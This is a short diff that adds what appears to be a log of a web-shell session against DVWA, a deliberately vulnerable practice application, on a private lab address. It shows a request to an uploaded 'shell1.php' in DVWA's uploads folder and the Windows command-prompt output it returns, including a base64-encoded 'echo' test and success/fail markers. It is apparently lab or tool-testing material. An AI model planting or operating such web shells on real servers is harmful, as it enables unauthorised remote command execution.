@@ -1,0 +1,13 @@
+http://192.168.217.130/dvwa/hackable/uploads/shell1.phprealcmdecho
+Microsoft Windows [版本 6.1.7601]
+版权所有 (c) 2009 Microsoft Corporation。保留所有权利。
+
+C:\phpstudy_pro\WWW\DVWA\hackable\uploads>
+ZWNobwo=
+success
+fail
+echo
+ECHO 处于打开状态。
+
+C:\phpstudy_pro\WWW\DVWA\hackable\uploads>
+
